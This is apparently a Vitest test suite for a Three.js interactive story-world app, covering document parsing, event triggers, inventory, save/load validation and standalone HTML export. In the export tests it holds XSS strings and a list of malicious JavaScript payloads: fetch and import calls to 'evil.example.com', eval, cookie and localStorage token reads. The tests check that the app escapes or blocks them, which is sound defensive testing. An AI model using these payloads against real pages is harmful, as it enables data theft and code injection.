import { describe, it, expect, beforeEach } from 'vitest';
import * as THREE from 'three';
import {
  parseDocument,
  extractChapters,
  extractCharacters,
  extractWorldLore,
  MAX_DOCUMENT_CHARS,
} from '../src/renderer/llm/DocumentParser';
import { EventSystem } from '../src/renderer/engine/EventSystem';
import { useInventoryStore } from '../src/renderer/store/inventoryStore';
import { useWorldStore } from '../src/renderer/store/worldStore';
import { useUIStore } from '../src/renderer/store/uiStore';
import { WorldBuilder } from '../src/renderer/engine/WorldBuilder';
import { SceneManager } from '../src/renderer/engine/SceneManager';
import { SavedWorldSchema, type SceneGraph, type EventTrigger } from '../src/shared/schema/sceneGraph.schema';
import type { SavedWorld } from '../src/shared/ipc.types';
import { generateStandaloneHtml, validateExportCode, EXPORT_BLOCKED_PATTERNS } from '../src/shared/exportHtml';

describe('Phase 4: Story Engine — Comprehensive Verification', () => {
  beforeEach(() => {
    useWorldStore.getState().resetWorld();
    useInventoryStore.getState().clearInventory();
    useUIStore.getState().setSelectedNode(null);
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.1 Document Parser Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.1 Document Parser & Chunking Strategy', () => {
    it('under 50K chars: preserves full document text and flags isChunked=false', async () => {
      const shortStory = `# The Whispering Woods
Chapter 1: The Gathering
Eldrin the Ranger stepped through the ancient pine grove.
The wooden cabin stood silently in the mist.
Chapter 2: The Secret Vault
Near the ruined stone well, a golden key lay hidden beneath the moss.`;

      const result = await parseDocument(shortStory, 'whispering_woods.md');
      expect(result.isChunked).toBe(false);
      expect(result.text).toBe(shortStory);
      expect(result.originalLength).toBe(shortStory.length);
      expect(result.extractedChapters).toContain('The Whispering Woods');
      expect(result.extractedChapters).toContain('The Gathering');
      expect(result.extractedCharacters).toContain('Eldrin');
    });

    it('over 50K chars: intelligently extracts chapters, characters, and condenses below 50K chars', async () => {
      // Build a synthetic large document (75,000+ characters) with chapters and characters
      const chapterHeaders = [
        '# Chapter 1: The Broken Spire',
        '# Chapter 2: Whispers in the Crypt',
        '# Chapter 3: The Witch of the Black Mire',
        '# Chapter 4: The Alchemist of High Citadel',
        '# Chapter 5: Gates of the Forgotten Kingdom',
      ];

      const filler = 'The dark clouds hung heavily over the crumbling castle walls and foggy river. '.repeat(180);
      let hugeDoc = '';
      for (const ch of chapterHeaders) {
        hugeDoc += `${ch}\n\n`;
        hugeDoc += `Cast: Mira the Sorceress, Captain Vael, and Torvin the Blacksmith.\n\n`;
        hugeDoc += `Mira: "We must unlock the iron door before midnight."\n\n`;
        hugeDoc += `${filler}\n\n`;
      }

      expect(hugeDoc.length).toBeGreaterThan(55_000);

      const result = await parseDocument(hugeDoc, 'epic_novel.txt');
      expect(result.isChunked).toBe(true);
      expect(result.originalLength).toBe(hugeDoc.length);
      expect(result.text.length).toBeLessThanOrEqual(MAX_DOCUMENT_CHARS);

      // Verify that all major chapters were recognized
      expect(result.extractedChapters.length).toBeGreaterThanOrEqual(5);
      expect(result.extractedChapters.some((c) => c.includes('Broken Spire'))).toBe(true);
      expect(result.extractedChapters.some((c) => c.includes('Black Mire'))).toBe(true);

      // Verify character extraction
      expect(result.extractedCharacters.some((c) => c.includes('Mira'))).toBe(true);
      expect(result.extractedCharacters.some((c) => c.includes('Torvin'))).toBe(true);

      // Verify structured summary header in text
      expect(result.text).toContain('[STORY BIBLE EXTRACTED FROM:');
      expect(result.text).toContain('CHAPTERS & MILESTONES');
    });

    it('handles empty and whitespace-only documents gracefully', async () => {
      const emptyResult = await parseDocument('', 'empty.txt');
      expect(emptyResult.text).toBe('');
      expect(emptyResult.isChunked).toBe(false);
      expect(emptyResult.extractedChapters).toEqual([]);
      expect(emptyResult.extractedCharacters).toEqual([]);

      const wsResult = await parseDocument('    \n\n   \t  ');
      expect(wsResult.text).toBe('');
      expect(wsResult.isChunked).toBe(false);
    });

    it('extracts world lore and environment settings accurately', () => {
      const text = `
The ancient fortress overlooked a misty valley and dark pine forest.
Random sentence that contains no geographical or structural keywords.
Deep inside the sunken temple, an altar glowed near the underground lake.
Another unrelated thought about philosophy.
`;
      const lore = extractWorldLore(text);
      expect(lore.length).toBe(2);
      expect(lore[0]).toContain('fortress');
      expect(lore[1]).toContain('temple');
    });

    it('directly extracts chapters and characters via helper functions', () => {
      const sample = '# Act 1: The Awakening\nCaptain Vael entered the courtyard.';
      expect(extractChapters(sample)).toContain('The Awakening');
      expect(extractCharacters(sample)).toContain('Captain Vael');
    });

    it('extractChapters rejects prose false-positives', () => {
      const prose = `
Part of the ancient castle was overgrown with thorny vines.
Act quickly or the shadow will consume the kingdom.
Chapter 1: The Silver Key
Scene 4: The Forgotten Gate
`;
      const chapters = extractChapters(prose);
      expect(chapters.some((c) => c.toLowerCase().includes('part of the ancient'))).toBe(false);
      expect(chapters.some((c) => c.toLowerCase().includes('act quickly'))).toBe(false);
      expect(chapters.some((c) => c.includes('The Silver Key'))).toBe(true);
      expect(chapters.some((c) => c.includes('The Forgotten Gate'))).toBe(true);
    });

    it('extractCharacters ignores non-character markers and directive headings', () => {
      const text = `
Note: The gate is locked from the inside.
Warning: Beware of traps in the courtyard.
Important: Gather three keys first.
Eldrin: "The path is clear now."
Lyra whispered: "Follow me."
`;
      const chars = extractCharacters(text);
      expect(chars).not.toContain('Note');
      expect(chars).not.toContain('Warning');
      expect(chars).not.toContain('Important');
      expect(chars).toContain('Eldrin');
      expect(chars).toContain('Lyra');
    });
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.2 & 4.3 EventSystem & Action Handlers Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.2 & 4.3 EventSystem, Action Handlers & Progression Flags', () => {
    let eventSystem: EventSystem;
    let scene: THREE.Scene;

    beforeEach(() => {
      scene = new THREE.Scene();
      eventSystem = new EventSystem();
    });

    it('registers single and multiple events correctly', () => {
      const trigger1: EventTrigger = {
        id: 't1',
        type: 'proximity',
        target: 'obj_1',
        action: { type: 'show_text', payload: { text: 'Hello' } },
      };
      const trigger2: EventTrigger = {
        id: 't2',
        type: 'interaction',
        target: 'obj_2',
        action: { type: 'set_flag', payload: { key: 'flag_2', value: true } },
      };

      eventSystem.registerEvent(trigger1);
      eventSystem.appendEvents([trigger2]);

      // Duplicate registration does not duplicate
      eventSystem.registerEvent(trigger1);
      expect((eventSystem as any).events.length).toBe(2);
    });

    it('DoD 4.2: Walk near door -> proximity event fires -> shows text notification', () => {
      const doorMesh = new THREE.Mesh(new THREE.BoxGeometry(1, 2, 0.2));
      doorMesh.position.set(0, 0, 5);
      doorMesh.userData = { id: 'dungeon_door', locked: true, collidable: true };
      scene.add(doorMesh);

      const trigger: EventTrigger = {
        id: 'door_proximity_event',
        type: 'proximity',
        target: 'dungeon_door',
        range: 3.0,
        action: {
          type: 'show_text',
          payload: { text: 'You hear a cold wind behind the iron door.' },
        },
      };

      eventSystem.registerEvent(trigger);

      // Player far away (z=15, distance = 10 > 3)
      eventSystem.tick(0.016, new THREE.Vector3(0, 0, 15), scene);
      expect(useUIStore.getState().notifications.length).toBe(0);

      // Player walks close (z=6, distance = 1 < 3) -> Fires!
      eventSystem.tick(0.016, new THREE.Vector3(0, 0, 6), scene);
      expect(useUIStore.getState().notifications.length).toBe(1);
      expect(useUIStore.getState().notifications[0].message).toContain('cold wind');

      // Subsequent ticks do NOT re-fire once-only event
      eventSystem.tick(0.016, new THREE.Vector3(0, 0, 6), scene);
      expect(useUIStore.getState().notifications.length).toBe(1);
    });

    it('DoD 4.3 & 4.8: Press E on door -> door unlocks, swing opens, sets flag, shows "The door creaks open"', () => {
      const doorMesh = new THREE.Mesh(new THREE.BoxGeometry(1, 2, 0.2));
      doorMesh.position.set(0, 0, 5);
      doorMesh.userData = { id: 'wooden_door', locked: true, collidable: true };
      scene.add(doorMesh);

      const trigger: EventTrigger = {
        id: 'unlock_wooden_door',
        type: 'interaction',
        target: 'wooden_door',
        action: {
          type: 'unlock',
          payload: {
            targetId: 'wooden_door',
            flag: 'wooden_door_unlocked',
            text: 'The door creaks open',
          },
        },
      };

      eventSystem.registerEvent(trigger);

      // Trigger interaction via E key
      const handled = eventSystem.handleInteraction('wooden_door', undefined, scene);
      expect(handled).toBe(true);

      // Door is unlocked, collidable is false, rotated by 90 degrees
      expect(doorMesh.userData.locked).toBe(false);
      expect(doorMesh.userData.collidable).toBe(false);
      expect(doorMesh.rotation.y).toBeCloseTo(Math.PI / 2);

      // Story flags are set in worldStore
      const flags = useWorldStore.getState().flags;
      expect(flags.wooden_door_unlocked).toBe(true);
      expect(flags.door_unlocked).toBe(true);

      // Notification shown
      const notifs = useUIStore.getState().notifications;
      expect(notifs.some((n) => n.message.includes('The door creaks open'))).toBe(true);

      // Door does NOT re-lock on subsequent events or ticks (persistence)
      eventSystem.tick(0.016, new THREE.Vector3(0, 0, 5), scene);
      expect(doorMesh.userData.locked).toBe(false);
      expect(useWorldStore.getState().flags.wooden_door_unlocked).toBe(true);
    });

    it('handles item_use trigger requiring active item from inventory', () => {
      const chestMesh = new THREE.Mesh(new THREE.BoxGeometry(1, 1, 1));
      chestMesh.userData = { id: 'ruby_chest', locked: true };
      scene.add(chestMesh);

      const trigger: EventTrigger = {
        id: 'chest_item_use',
        type: 'item_use',
        target: 'ruby_chest',
        requiredItem: 'rusty_key',
        action: {
          type: 'unlock',
          payload: { targetId: 'ruby_chest', text: 'The chest unlocks with a click!' },
        },
      };

      eventSystem.registerEvent(trigger);

      // Interaction without item or wrong item fails
      const noItem = eventSystem.handleInteraction('ruby_chest', undefined, scene);
      expect(noItem).toBe(false);
      expect(chestMesh.userData.locked).toBe(true);

      const wrongItem = eventSystem.handleInteraction('ruby_chest', 'gold_coin', scene);
      expect(wrongItem).toBe(false);
      expect(chestMesh.userData.locked).toBe(true);

      // Interaction with requiredItem succeeds
      const correctItem = eventSystem.handleInteraction('ruby_chest', 'rusty_key', scene);
      expect(correctItem).toBe(true);
      expect(chestMesh.userData.locked).toBe(false);
    });

    it('prioritizes matching item_use trigger over generic interaction trigger when item is active', () => {
      const doorMesh = new THREE.Mesh(new THREE.BoxGeometry(1, 2, 0.2));
      doorMesh.userData = { id: 'crypt_door', locked: true };
      scene.add(doorMesh);

      // Generic interaction trigger: inspects door
      eventSystem.registerEvent({
        id: 'inspect_door',
        type: 'interaction',
        target: 'crypt_door',
        action: {
          type: 'show_text',
          payload: { text: 'The crypt door requires a bone key.' },
        },
      });

      // Specific item_use trigger: unlocks door
      eventSystem.registerEvent({
        id: 'unlock_door_with_key',
        type: 'item_use',
        target: 'crypt_door',
        requiredItem: 'bone_key',
        action: {
          type: 'unlock',
          payload: { targetId: 'crypt_door', flag: 'crypt_unlocked' },
        },
      });

      // When player uses bone_key on crypt_door, item_use trigger fires instead of inspect
      const handled = eventSystem.handleInteraction('crypt_door', 'bone_key', scene);
      expect(handled).toBe(true);
      expect(doorMesh.userData.locked).toBe(false);
      expect(useWorldStore.getState().flags.crypt_unlocked).toBe(true);
    });

    it('handles time and flag continuous triggers', () => {
      let teleportedPos: [number, number, number] | null = null;
      const customEventSystem = new EventSystem({
        onTeleport: (pos) => {
          teleportedPos = pos;
        },
      });

      const timeTrigger: EventTrigger = {
        id: 'time_teleport',
        type: 'time',
        target: 'player',
        range: 5.0, // 5 seconds
        action: {
          type: 'teleport_player',
          payload: { position: [10, 2, -15] },
        },
      };

      const flagTrigger: EventTrigger = {
        id: 'flag_notification',
        type: 'flag',
        target: 'boss_door',
        condition: 'boss_defeated',
        action: {
          type: 'show_text',
          payload: { text: 'The great seal dissipates!' },
        },
      };

      customEventSystem.registerAll([timeTrigger, flagTrigger]);

      // Tick 2 seconds -> time trigger does not fire yet
      customEventSystem.tick(2.0, new THREE.Vector3(0, 0, 0), scene);
      expect(teleportedPos).toBeNull();

      // Tick 4 more seconds (total 6 > 5) -> time trigger fires!
      customEventSystem.tick(4.0, new THREE.Vector3(0, 0, 0), scene);
      expect(teleportedPos).toEqual([10, 2, -15]);

      // Flag trigger before condition
      customEventSystem.tick(0.016, new THREE.Vector3(0, 0, 0), scene);
      expect(useUIStore.getState().notifications.some((n) => n.message.includes('great seal'))).toBe(false);

      // Set flag in worldStore
      useWorldStore.getState().setFlag('boss_defeated', true);
      customEventSystem.tick(0.016, new THREE.Vector3(0, 0, 0), scene);
      expect(useUIStore.getState().notifications.some((n) => n.message.includes('great seal'))).toBe(true);
    });
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.4 Dynamic World Update (Patch Mode) Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.4 Dynamic World Update (Patch Mode)', () => {
    it('DoD 4.4: patches scene graph and adds entities live without full scene reload', () => {
      const baseGraph: SceneGraph = {
        version: '1.0',
        world: {
          name: 'Witch Forest',
          description: 'A haunted forest with a crooked cabin.',
          biome: 'forest',
          timeOfDay: 'dusk',
          weather: 'fog',
          scale: 'medium',
        },
        player: {
          spawn: [0, 1.7, 0],
          startPosition: [0, 1.7, 0],
          movementSpeed: 4.0,
          jumpHeight: 1.5,
        },
        zones: [],
        characters: [
          {
            id: 'mira_witch',
            name: 'Mira',
            description: 'A cloaked witch',
            personality: 'Enigmatic and sharp',
            secrets: [],
            knowledge: [],
            position: [10, 0, 5],
            behavior: 'idle',
          },
        ],
        objects: [
          {
            id: 'witch_cabin',
            name: 'Witch Cabin',
            type: 'structure',
            description: 'A crooked wooden cabin',
            position: [8, 0, 5],
            scale: [4, 4, 4],
            collidable: true,
            interactable: true,
            pickable: false,
            locked: false,
          },
        ],
        lights: [],
        events: [],
        skybox: { type: 'gradient', topColor: 0x111827, bottomColor: 0x0a0c10 },
        atmosphere: { fogColor: 0x1a1a2e, fogDensity: 0.02, ambientIntensity: 0.5, sunColor: '#fff4e0' },
        flags: {},
      };

      useWorldStore.getState().setSceneGraph(baseGraph);

      // Partial patch payload returned from LLM updateWorld
      const patch: Partial<SceneGraph> = {
        objects: [
          {
            id: 'bonfire_1',
            name: 'Bonfire',
            type: 'bonfire',
            description: 'A roaring campfire casting long shadows',
            position: [12, 0, 6],
            scale: [1, 1, 1],
            collidable: true,
            interactable: true,
            pickable: false,
            locked: false,
          },
        ],
      };

      // Patch store
      useWorldStore.getState().patchSceneGraph(patch);

      const updatedGraph = useWorldStore.getState().sceneGraph;
      expect(updatedGraph).not.toBeNull();
      // Existing cabin preserved
      expect(updatedGraph?.objects.some((o) => o.id === 'witch_cabin')).toBe(true);
      // New bonfire added
      expect(updatedGraph?.objects.some((o) => o.id === 'bonfire_1')).toBe(true);
      expect(updatedGraph?.objects.length).toBe(2);
      // Character Mira preserved
      expect(updatedGraph?.characters.length).toBe(1);
    });

    it('WorldBuilder.applyPatch modifies Three.js scene directly without clearing existing meshes', () => {
      // SceneManager in test environment
      const sceneManager = new SceneManager();
      const worldBuilder = new WorldBuilder(sceneManager);

      // Add a base object to scene
      const baseObj = new THREE.Mesh(new THREE.BoxGeometry(2, 2, 2));
      baseObj.userData = { id: 'hut', name: 'Hut' };
      sceneManager.add(baseObj);
      expect(sceneManager.scene.children.includes(baseObj)).toBe(true);

      // Apply live patch to add bonfire
      worldBuilder.applyPatch({
        objects: [
          {
            id: 'bonfire_live',
            name: 'Bonfire',
            type: 'item',
            description: 'Fire',
            position: [5, 0, 5],
            scale: [1, 1, 1],
            collidable: false,
            interactable: true,
            pickable: false,
            locked: false,
          },
        ],
      });

      // Both original hut and new bonfire exist in scene!
      expect(sceneManager.scene.children.includes(baseObj)).toBe(true);
      let foundBonfire = false;
      sceneManager.scene.traverse((c) => {
        if (c.userData?.id === 'bonfire_live') foundBonfire = true;
      });
      expect(foundBonfire).toBe(true);

      worldBuilder.dispose();
      sceneManager.dispose();
    });
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.5 Inventory System Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.5 Inventory System & Slot Management', () => {
    it('DoD 4.5: Picking up items adds to inventory and selects slots accurately', () => {
      const inv = useInventoryStore.getState();

      const item1 = { id: 'golden_key', name: 'Golden Key', icon: '🗝️', description: 'Opens temple gate' };
      const item2 = { id: 'healing_potion', name: 'Elixir', icon: '🧪', description: 'Restores vitality' };

      expect(inv.addItem(item1)).toBe(true);
      expect(inv.addItem(item2)).toBe(true);

      expect(useInventoryStore.getState().items.length).toBe(2);
      expect(useInventoryStore.getState().items[0].name).toBe('Golden Key');

      // Select slot 0
      useInventoryStore.getState().selectSlot(0);
      expect(useInventoryStore.getState().selectedSlot).toBe(0);
      expect(useInventoryStore.getState().getSelectedItem()?.id).toBe('golden_key');

      // Select slot 1
      useInventoryStore.getState().selectSlot(1);
      expect(useInventoryStore.getState().selectedSlot).toBe(1);
      expect(useInventoryStore.getState().getSelectedItem()?.id).toBe('healing_potion');

      // Toggling same slot deselects
      useInventoryStore.getState().selectSlot(1);
      expect(useInventoryStore.getState().selectedSlot).toBeNull();
      expect(useInventoryStore.getState().getSelectedItem()).toBeNull();
    });

    it('enforces maximum 8 slot limit and prevents duplicates', () => {
      const inv = useInventoryStore.getState();
      for (let i = 0; i < 8; i++) {
        inv.addItem({ id: `item_${i}`, name: `Item ${i}` });
      }
      expect(useInventoryStore.getState().items.length).toBe(8);

      // 9th item rejected
      const overflow = useInventoryStore.getState().addItem({ id: 'item_9', name: 'Item 9' });
      expect(overflow).toBe(false);
      expect(useInventoryStore.getState().items.length).toBe(8);

      // Duplicate item id does not add duplicate
      inv.addItem({ id: 'item_0', name: 'Duplicate Item' });
      expect(useInventoryStore.getState().items.length).toBe(8);
    });
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.6 World Library & Save / Load Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.6 World Library & Save / Load Schema Integrity', () => {
    it('DoD 4.6: Serializes world, flags, and player position; restores identically on load', () => {
      const testWorldGraph: SceneGraph = {
        version: '1.0',
        world: {
          name: 'The Sunken Citadel',
          description: 'A subterranean cavern with ruins submerged in water.',
          biome: 'dungeon',
          timeOfDay: 'night',
          weather: 'fog',
          scale: 'large',
        },
        player: {
          spawn: [15, 2.5, -30],
          startPosition: [15, 2.5, -30],
          movementSpeed: 4.0,
          jumpHeight: 1.5,
        },
        zones: [],
        characters: [
          {
            id: 'guardian',
            name: 'Crypt Guardian',
            description: 'Stone sentinel',
            personality: 'Silent observer',
            secrets: ['The lever is behind the column'],
            knowledge: ['Citadel history'],
            position: [12, 0, -25],
            behavior: 'idle',
          },
        ],
        objects: [
          {
            id: 'lever_1',
            name: 'Bronze Lever',
            type: 'item',
            description: 'An ancient mechanism',
            position: [14, 1, -29],
            scale: [0.5, 1, 0.5],
            collidable: true,
            interactable: true,
            pickable: false,
            locked: false,
          },
        ],
        lights: [],
        events: [],
        skybox: { type: 'gradient', topColor: 0x050508, bottomColor: 0x000000 },
        atmosphere: { fogColor: 0x050508, fogDensity: 0.035, ambientIntensity: 0.2, sunColor: '#fff4e0' },
        flags: { gate_opened: true, treasure_claimed: false },
      };

      const savedWorld: SavedWorld = {
        name: testWorldGraph.world.name,
        timestamp: Date.now(),
        sceneGraph: testWorldGraph,
        generatedCode: '// Three.js generated code here',
        flags: { gate_opened: true, treasure_claimed: false },
        playerPosition: [15, 2.5, -30],
      };

      // Validate schema
      const parseResult = SavedWorldSchema.safeParse(savedWorld);
      expect(parseResult.success).toBe(true);

      // Simulate loading into store
      useWorldStore.getState().setSceneGraph(savedWorld.sceneGraph);
      useWorldStore.getState().setPlayerPosition(savedWorld.playerPosition);
      if (savedWorld.flags) {
        Object.entries(savedWorld.flags).forEach(([k, v]) => {
          useWorldStore.getState().setFlag(k, v);
        });
      }

      const loadedGraph = useWorldStore.getState().sceneGraph;
      expect(loadedGraph?.world.name).toBe('The Sunken Citadel');
      expect(useWorldStore.getState().playerPosition).toEqual([15, 2.5, -30]);
      expect(useWorldStore.getState().flags.gate_opened).toBe(true);
      expect(useWorldStore.getState().flags.treasure_claimed).toBe(false);
    });

    it('rejects corrupted or malicious world files during schema validation', () => {
      const invalidWorld = {
        name: 'Hacked World',
        sceneGraph: {
          world: { biome: 'unknown_biome_xyz' }, // Invalid biome
        },
      };

      const res = SavedWorldSchema.safeParse(invalidWorld);
      expect(res.success).toBe(false);
    });

    it('persists door unlocked state across world reload and flag state', () => {
      useWorldStore.getState().setFlag('crypt_door_unlocked', true);
      const flags = useWorldStore.getState().flags;

      const objDef = {
        id: 'crypt_door',
        name: 'Crypt Door',
        type: 'door',
        locked: true,
        collidable: true,
      };

      const isDoor = objDef.type === 'door' || objDef.id.includes('door');
      const isAlreadyUnlocked = Boolean(
        flags[`${objDef.id}_unlocked`] || (isDoor && flags.door_unlocked)
      );

      const mesh = new THREE.Mesh(new THREE.BoxGeometry(1, 2, 0.2));
      mesh.userData = {
        id: objDef.id,
        name: objDef.name,
        type: objDef.type,
        collidable: isAlreadyUnlocked ? false : objDef.collidable,
        locked: isAlreadyUnlocked ? false : objDef.locked,
      };
      if (isAlreadyUnlocked && isDoor) {
        mesh.rotation.y += Math.PI / 2;
      }

      expect(mesh.userData.locked).toBe(false);
      expect(mesh.userData.collidable).toBe(false);
      expect(mesh.rotation.y).toBeCloseTo(Math.PI / 2);
    });
  });

  // ────────────────────────────────────────────────────────────────────────────
  // 4.7 HTML Standalone Export Validation Tests
  // ────────────────────────────────────────────────────────────────────────────
  describe('4.7 Standalone HTML Export', () => {
    const sampleGraph: SceneGraph = {
      version: '1.0',
      world: {
        name: 'Export Realm',
        description: 'A test realm for standalone browser execution.',
        biome: 'forest',
        timeOfDay: 'morning',
        weather: 'clear',
        scale: 'small',
      },
      player: {
        spawn: [0, 1.7, 5],
        startPosition: [0, 1.7, 5],
        movementSpeed: 4.0,
        jumpHeight: 1.5,
      },
      zones: [],
      characters: [
        {
          id: 'npc_1',
          name: 'Wanderer',
          description: 'A traveler',
          personality: 'Friendly',
          secrets: [],
          knowledge: [],
          position: [2, 0, 2],
          behavior: 'idle',
          dialogueSeed: 'Welcome to the standalone world!',
        },
      ],
      objects: [
        {
          id: 'gate',
          name: 'Gate',
          type: 'structure',
          description: 'Archway',
          position: [0, 0, -5],
          scale: [2, 3, 1],
          collidable: true,
          interactable: true,
          pickable: false,
          locked: false,
        },
      ],
      lights: [],
      events: [],
      skybox: { type: 'gradient', topColor: 0x1e3a5f, bottomColor: 0x0f172a },
      atmosphere: { fogColor: 0x0f172a, fogDensity: 0.015, ambientIntensity: 0.5, sunColor: '#fff4e0' },
      flags: {},
    };

    it('DoD 4.7: Generates complete, functional standalone HTML with Three.js CDN and ground plane', () => {
      const html = generateStandaloneHtml(sampleGraph);

      expect(html).toContain('<!DOCTYPE html>');
      expect(html).toContain('<title>Export Realm - Orbis Standalone</title>');
      expect(html).toContain('https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js');
      expect(html).toContain('id="worldCanvas"');
      expect(html).toContain('new THREE.PlaneGeometry(300, 300');
      expect(html).toContain('0x2d4a22'); // Forest ground plane color
      expect(html).toContain('Wanderer');
      expect(html).toContain('Welcome to the standalone world!');
      expect(html).toContain('PointerLockControls');
      expect(html).toContain('crosshair');
    });

    it('enforces strict Content-Security-Policy blocking network exfiltration and scripts', () => {
      const html = generateStandaloneHtml(sampleGraph);

      expect(html).toContain('Content-Security-Policy');
      expect(html).toContain("default-src 'none'");
      expect(html).toContain("connect-src 'none'");
      expect(html).toContain("form-action 'none'");
    });

    it('escapes world name and special characters to prevent HTML/XSS injection', () => {
      const xssGraph: SceneGraph = {
        ...sampleGraph,
        world: {
          ...sampleGraph.world,
          name: '<script>alert("pwned")</script>',
          description: '"><img src=x onerror=alert(1)>',
        },
      };

      const html = generateStandaloneHtml(xssGraph);
      expect(html).not.toContain('<title><script>alert("pwned")</script>');
      expect(html).toContain('&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;');
    });

    it('validates and embeds safe custom Three.js code while blocking malicious patterns', () => {
      // Safe code
      const safeCode = `
        const box = new THREE.Mesh(new THREE.BoxGeometry(1, 1, 1), new THREE.MeshBasicMaterial());
        scene.add(box);
      `;
      expect(validateExportCode(safeCode)).toBe(safeCode);

      const htmlWithSafeCode = generateStandaloneHtml({
        ...sampleGraph,
        code: safeCode,
      });
      expect(htmlWithSafeCode).toContain('new THREE.BoxGeometry(1, 1, 1)');

      // Dangerous codes blocked by validateExportCode
      const maliciousPayloads = [
        `fetch('https://evil.example.com/steal', { method: 'POST' })`,
        `eval('alert("hack")')`,
        `window.location.href = 'https://evil.example.com'`,
        `document.cookie = 'stolen'`,
        `this.constructor.constructor('return process')()`,
        `localStorage.getItem('token')`,
        `import('https://evil.example.com/payload.js')`,
      ];

      for (const payload of maliciousPayloads) {
        expect(validateExportCode(payload)).toBe('');
      }

      // Standalone HTML generated with malicious code strips the code
      const htmlWithExploit = generateStandaloneHtml({
        ...sampleGraph,
        code: `fetch('https://evil.example.com/steal')`,
      });
      expect(htmlWithExploit).not.toContain('fetch(');
    });

    it('escapes closing </script> tags in serialized graph JSON to prevent HTML breakout', () => {
      const breakoutGraph: SceneGraph = {
        ...sampleGraph,
        world: {
          ...sampleGraph.world,
          name: 'Breakout </script><script>alert(1)</script>',
        },
      };

      const html = generateStandaloneHtml(breakoutGraph);
      expect(html).not.toMatch(/<\/script>.*<script>alert\(1\)<\/script>/);
      expect(html).toContain('<\\/script>');
    });
  });
});
